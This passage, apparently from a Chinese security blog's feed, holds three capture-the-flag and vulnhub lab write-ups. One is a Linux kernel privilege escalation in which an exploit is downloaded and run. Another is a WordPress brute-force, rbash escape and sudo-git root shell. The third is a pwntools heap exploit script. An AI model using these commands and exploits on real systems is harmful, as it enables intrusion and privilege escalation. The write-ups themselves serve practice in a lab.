class="line">192.168.147.132: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.132] 52528</span><br><span class="line">Linux DC3VM 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</span><br><span class="line"> 13:48:01 up  2:02,  0 users,  load average: 0.00, 0.01, 0.07</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>ç„¶åæƒ³åŠæ³•ææƒ</p><p>å…ˆæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ä¸ç”¨å¯†ç çš„rootæŒ‡ä»¤,æˆ–è€…æœ‰setuidçš„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/mount</span><br><span class="line">/tmp/39773/refcount_overflow/39772/ebpf_mapfd_doubleput_exploit/suidhelper</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/ubuntu-core-launcher</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/i386-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line"></span><br><span class="line">æ²¡å•¥ç”¨</span><br><span class="line"></span><br><span class="line">sudo -l</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure><p>(ç»“æœä½¿ç”¨å†…æ ¸çš„æ¼æ´ææƒ)</p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/issue</span></span><br><span class="line">Ubuntu 16.04 LTS \n \l</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨<code>searchsploit</code>å¯»æ‰¾æ¼æ´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> searchsploit <span class="string">&quot;Ubuntu 16.04&quot;</span></span></span><br><span class="line"></span><br><span class="line">Linux Kernel 4.4.x (Ubuntu 16.04) - &#x27;double-fdput()&#x27; bpf(BPF_PROG_LOAD) Pri | exploits/linux/local/39772.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/39772.txt</span></span><br><span class="line"></span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure><p>åœ¨é¶æœºä¸Šçš„<code>/tmp</code>æ–‡ä»¶å¤¹ä¸‹ä½¿ç”¨<code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code>,å¹¶ä¸”è§£å‹,é‡Œé¢æœ‰ä¸€ä¸ª<code>exploit.tar</code>,ä¹Ÿè§£å‹,è¿è¡Œ<code>complie.sh</code>ç¼–è¯‘ä¼šæœ‰è­¦å‘Š,ä½†æ˜¯æ²¡å…³ç³»,è¿è¡Œ<code>doubleput</code>å°±èƒ½å¾—åˆ°<code>rootæƒé™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./doubleput</span></span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> DC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> Joomla </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC-2é¶æœº</title>
      <link href="/DC-2.html"/>
      <url>/DC-2.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ DC-2 é¶æœº</p><p>åˆå­¦è€…éš¾åº¦</p><a id="more"></a><h2 id="é¶æœºåœ°å€"><a href="#é¶æœºåœ°å€" class="headerlink" title="é¶æœºåœ°å€"></a>é¶æœºåœ°å€</h2><p><a href="https://www.vulnhub.com/entry/dc-2,311/">vulnhub-DC2</a></p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆ,ä¸‹è½½å®Œæˆä¹‹åå¹¶æ²¡æœ‰ä¸»åŠ¨è·å¾—IPåœ°å€,è€Œä¸”ç½‘è¯¾æ¥å£åç§°ä¹Ÿæ˜¯å¯¹çš„.<br>åæ¥å°†<code>æ¡¥æ¥</code>æ”¹ä¸º<code>NAT</code>ä¹‹åå°±å¯ä»¥äº†</p><h2 id="1-NMAP-æ‰«æ"><a href="#1-NMAP-æ‰«æ" class="headerlink" title="1. NMAP æ‰«æ"></a>1. NMAP æ‰«æ</h2><p>åœ¨<code>kali</code>æœºä¸ŠæŸ¥çœ‹ipåœ°å€<code>ifconfig</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home&#x2F;kali&#x2F;vulnhub&#x2F;dc-2# ifconfig</span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.147.130  netmask 255.255.255.0  broadcast 192.168.147.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe2a:621f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:2a:62:1f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 175293  bytes 110023189 (104.9 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 150846  bytes 13877594 (13.2 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æœ¬æœºipåœ°å€ä¸º<code>192.168.147.130</code>æ‰€ä»¥é¶æœºçš„ipåœ¨<code>192.168.147.0/24</code>ç½‘æ®µ<br>ä½¿ç”¨<code>nmap</code>å·¥å…·æ‰«æç½‘æ®µ,å‘ç°ä¸»æœº<br><code>nmap 192.168.147.0/24</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for dc-2 (192.168.147.131)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:7C:97:D6 (VMware)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†é¶æœºçš„ipåœ°å€ä¸º<code>192.168.147.131</code>,å¹¶ä¸”åœ¨0-1000ç«¯å£åªå¼€å¯äº†<code>80ç«¯å£(http)</code><br>è¿›è¡Œæ›´åŠ æ·±åº¦çš„æ‰«æ<code>nmap -A 192.168.147.131</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586170890725-e1586177529774.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586170890725-e1586177529774.png"></a><br>æ˜¯ä¸€ä¸ª<code>WordPress</code>çš„æ¨¡æ¿</p><h2 id="2-è®¿é—®ç½‘ç«™"><a href="#2-è®¿é—®ç½‘ç«™" class="headerlink" title="2. è®¿é—®ç½‘ç«™"></a>2. è®¿é—®ç½‘ç«™</h2><h3 id="ä¿®æ”¹hosts"><a href="#ä¿®æ”¹hosts" class="headerlink" title="ä¿®æ”¹hosts"></a>ä¿®æ”¹hosts</h3><p>ä»ä¸Šé¢æ‰«æåˆ°çš„ä¿¡æ¯å¯ä»¥çœ‹åˆ°,æƒ³è¦è®¿é—®ç½‘ç«™,åªèƒ½é€šè¿‡<code>http://dc-2</code>,å› æ­¤éœ€è¦ä¿®æ”¹<code>hosts</code>æ–‡ä»¶,å°†<code>http://dc-2</code>è§£æåˆ°<code>192.168.147.131</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172286546-e1586177580223.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172286546-300x74.png"></a><br>çœ‹åˆ°æ˜¯ä¸€ä¸ª<code>WordPress</code>å’Œç¬¬ä¸€ä¸ª<code>flag</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172400798-e1586177605680.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172400798-300x91.png"></a><br><code>flag</code>å†…å®¹å¦‚ä¸‹<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172423639.png" alt="file"></p><h3 id="çˆ†ç ´WordPress"><a href="#çˆ†ç ´WordPress" class="headerlink" title="çˆ†ç ´WordPress"></a>çˆ†ç ´WordPress</h3><p>é€šå¸¸çš„å¯†ç å­—å…¸ä¸ä¸€å®šç®¡ç”¨,æ¨èäº†<a href="https://www.freebuf.com/articles/network/190128.html">cewl</a><br>æ ¹æ®é“¾æ¥çš„æ•™ç¨‹åˆ›å»ºå­—å…¸<br><code>cewl http://dc-2 -w dc2_password</code><br>æœ‰äº†å¯†ç å­—å…¸è¿˜éœ€è¦ç”¨æˆ·åå•Š,è¿™é‡Œä½¿ç”¨<a href="https://www.freebuf.com/sectool/174663.html">wpscan</a><br><code>wpscan --url http://dc-2 --enumerate u</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173208850-e1586177690710.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173208850-e1586177690710.png"></a></p><p>æ‰«æå‡ºæ¥ä¸‰ä¸ªç”¨æˆ·å,ä½¿ç”¨<code>wpscan</code>è¿›è¡Œçˆ†ç ´<br><code>wpscan --url http://dc-2 -U jerry(tom) -P dc2_password</code><br>Tom å’Œ Jerry çš„å¯†ç éƒ½æ˜¯å¯ä»¥çˆ†å‡ºæ¥çš„,adminä¸è¡Œ<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173679186.png" alt="file"><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173729041.png" alt="file"><br>å¾—åˆ°å¯†ç ä¹‹åç”¨Jerryçš„è´¦æˆ·ç™»å½•è¿›å…¥åå°,å¾—åˆ°ç¬¬äºŒä¸ªflag<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173819297.png" alt="file"></p><p>ç„¶åæç¤º,ç”¨å¦å¤–çš„ç™»å½•å£<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173840215.png" alt="file"></p><h2 id="å¦å¤–çš„ç™»å½•å£"><a href="#å¦å¤–çš„ç™»å½•å£" class="headerlink" title="å¦å¤–çš„ç™»å½•å£"></a>å¦å¤–çš„ç™»å½•å£</h2><p>çœ‹æ¥æ˜¯æ‰«æä¸åˆ°ä½,é”™è¿‡äº†ä¸€äº›ç«¯å£,<br><code>nmap -A 192.168.147.131 -p0-65535</code>,è¿›è¡Œç«¯å£å…¨æ‰«æ<br>æ‰«å‡ºæ¥ä¸€ä¸ª<code>ssh</code>ç«¯å£<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174130881-e1586177777434.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174130881-e1586177777434.png"></a><br>ä½¿ç”¨Tomçš„è´¦å·ç™»å½•é¶æœº<br><code>ssh tom@192.168.147.131 -p 7744</code><br>å‘ç°<code>cat</code>å‘½ä»¤è¢«å±è”½äº†<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174238395.png" alt="file"><br>æŸ¥çœ‹ä¸€ä¸‹<code>PATH</code>å’Œ<code>PATH</code>é‡Œé¢çš„å‘½ä»¤<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174279706.png" alt="file"><br>ç”¨<code>vi flag*</code>å¾—åˆ°ç¬¬ä¸‰ä¸ªflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes</span><br></pre></td></tr></table></figure><h3 id="åˆ‡æ¢åˆ°jerry"><a href="#åˆ‡æ¢åˆ°jerry" class="headerlink" title="åˆ‡æ¢åˆ°jerry"></a>åˆ‡æ¢åˆ°jerry</h3><p>æç¤ºéœ€è¦ç”¨Jerryçš„è´¦æˆ·å»ææƒ,å°è¯•åˆ‡æ¢åˆ°Jerryçš„è´¦æˆ·<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174360078.png" alt="file"><br>what?æ²¡æœ‰su?åœ¨çœ‹äº†ä¸€çœ¼,å—¯?rbash?<a href="https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/">æŸ¥æ‰¾èµ„æ–™</a>,æ˜¯ä¸€ä¸ªå—é™çš„shell,è¿™é‡Œå±è”½äº†<code>/</code>,çŸ¥è¯†å—é™,æ‰¾èµ„æ–™,ç»•è¿‡rbashçš„åŠæ³•<br>åœ¨<code>vi</code>é‡Œé¢åˆ›å»ºä¸€ä¸ªshell (????)<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174741956.png" alt="file"><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174752874.png" alt="file"><br>å¾—åˆ°shellä¹‹å,æŠŠç¯å¢ƒå˜é‡åŠ è¿›å»<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174807890.png" alt="file"><br>ç„¶åå°±å¯ä»¥åˆ‡æ¢è´¦æˆ·äº†<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174875420-e1586177809142.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174875420-e1586177937925.png"></a><br>æœ€åçš„æç¤ºæ˜¯ç”¨<code>git</code>ææƒ (????)</p><p>å…ˆçœ‹çœ‹æ‹¥æœ‰rootæƒé™çš„æŒ‡ä»¤<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175456005-e1586177847302.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175456005-e1586177925972.png"></a><br>gitæ˜¯ä¸ç”¨rootå¯†ç çš„,æ‰€ä»¥çœŸçš„è¦ç”¨gitææƒ<br>æ‰¾èµ„æ–™<br><code>sudo git -p help config</code> ç„¶åè¾“å…¥ <code>/bin/bash</code> å°±å¯ä»¥å¾—åˆ°rootæƒé™çš„shell,æ‹¿åˆ°æœ€åä¸€ä¸ªflag<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175578057-e1586177903521.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175578057-e1586177903521.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> DC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>one_gadget ä½¿ç”¨reallocè°ƒæ•´æ ˆ</title>
      <link href="/realloc_stack.html"/>
      <url>/realloc_stack.html</url>
      
        <content type="html"><![CDATA[<p>åœ¨ pwn åšé¢˜çš„æ—¶å€™,å¶å°”ä¼šç¢°åˆ° one_gadget å…¨éƒ¨ä¸æ»¡è¶³æ¡ä»¶çš„æƒ…å†µ,è¿™å°±éœ€è¦ä½¿ç”¨ <code>realloc</code> æ¥è°ƒæ•´æ ˆ</p><a id="more"></a><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>åœ¨åŠ«æŒ <code>__malloc_hook</code> ä¹‹åç”±äºæ ˆä¸å¯è°ƒæ•´,æ‰€ä»¥æœ‰æ—¶å€™ä¼šä¸æ»¡è¶³ <code>one_gadget</code> çš„è§¦å‘æ¡ä»¶<br>åœ¨ <code>realloc</code> å‡½æ•°ä¸­,æœ‰ 6 ä¸ª<code>push</code> æ“ä½œ,å¯ä»¥è°ƒæ•´æ ˆçš„æƒ…å†µ<br>è€Œä¸” <code>realloc</code> ä¼šè°ƒç”¨ <code>__realloc_hook</code> , <code>__realloc_hook</code> å°±åœ¨ <code>__malloc_hook</code> é™„è¿‘</p><h2 id="realloc-çš„-push-æ“ä½œ"><a href="#realloc-çš„-push-æ“ä½œ" class="headerlink" title="realloc çš„ push æ“ä½œ"></a>realloc çš„ push æ“ä½œ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0000000000846C0 realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0â†‘o</span><br><span class="line">.text:00000000000846C0                                         ; LOAD:000000000000CF48â†‘o ...</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 var_60          &#x3D; qword ptr -60h</span><br><span class="line">.text:00000000000846C0 var_58          &#x3D; byte ptr -58h</span><br><span class="line">.text:00000000000846C0 var_48          &#x3D; byte ptr -48h</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 ; __unwind &#123;</span><br><span class="line">.text:00000000000846C0                 push    r15             ; Alternative name is &#39;__libc_realloc&#39;</span><br><span class="line">.text:00000000000846C2                 push    r14</span><br><span class="line">.text:00000000000846C4                 push    r13</span><br><span class="line">.text:00000000000846C6                 push    r12</span><br><span class="line">.text:00000000000846C8                 mov     r13, rsi</span><br><span class="line">.text:00000000000846CB                 push    rbp</span><br><span class="line">.text:00000000000846CC                 push    rbx</span><br><span class="line">.text:00000000000846CD                 mov     rbx, rdi</span><br><span class="line">.text:00000000000846D0                 sub     rsp, 38h</span><br><span class="line">.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:00000000000846DB                 mov     rax, [rax]</span><br><span class="line">.text:00000000000846DE                 test    rax, rax</span><br><span class="line">.text:00000000000846E1                 jnz     loc_848E8</span><br></pre></td></tr></table></figure><h2 id="è°ƒæ•´å®æˆ˜"><a href="#è°ƒæ•´å®æˆ˜" class="headerlink" title="è°ƒæ•´å®æˆ˜"></a>è°ƒæ•´å®æˆ˜</h2><p>ç”¨çš„æ˜¯ <code>axb_2019_heap</code><br>ä¸€ä¸ªå¾ˆå¸¸è§çš„æº¢å‡º,ä½¿ç”¨ <code>unlink</code> ,å¾—åˆ°ä»»æ„åœ°å€è¯»å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content,ends = <span class="number">1</span></span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">formats = <span class="string">&quot;%3$p%11$p&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(formats)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">codebase = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x1186</span></span><br><span class="line">print(<span class="string">&quot;codebase ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(codebase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(addr))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapArray = codebase + <span class="number">0x202060</span></span><br><span class="line">fake_fd = heapArray + <span class="number">0x20</span></span><br><span class="line">payload = (p64(<span class="number">0</span>) + p64(<span class="number">0xE1</span>) + p64(fake_fd - <span class="number">0x18</span>) + p64(fake_fd - <span class="number">0x10</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0xE0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xE0</span>) + p64(<span class="number">0xE0</span>)</span><br><span class="line">payload += p64(<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨ <code>one_gadget[1]</code> å‘ç°æ ˆå¹¶ä¸æ»¡è¶³æ¡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(realloc_hook) + <span class="string">b&#x27;\xf8\x00&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + base</span><br><span class="line">edit(<span class="number">1</span>,p64(one_gadget) + p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924384776.png" alt="file"></p><p>éœ€è¦ç”¨ <code>realloc</code> æ¥è°ƒæ•´æ ˆ</p><h3 id="è°ƒæ•´æŠ€å·§"><a href="#è°ƒæ•´æŠ€å·§" class="headerlink" title="è°ƒæ•´æŠ€å·§"></a>è°ƒæ•´æŠ€å·§</h3><p>é¦–å…ˆçœ‹åˆ° <code>realloc</code> å‡½æ•°çš„æ±‡ç¼–,åœ¨ <code>offset = 0x10</code> çš„åœ°æ–¹æœ‰ä¸€ä¸ª <code>sub rsp,38h</code>,å› ä¸ºè¿™ä¸€å¥æ˜¯åœ¨æ‰€æœ‰çš„ <code>push</code> æ“ä½œå®Œäº†ä¹‹å,æ‰€ä»¥å¿…å®šä¼šæ‰§è¡Œ,è€Œä¸”å½±å“æ ˆçš„åˆ†å¸ƒ, æ‰€ä»¥å…ˆæ§åˆ¶ <code>__malloc_hook</code> æŒ‡å‘ <code>realloc + 0x10</code> åŒæ—¶ <code>__realloc_hook</code> æŒ‡å‘ 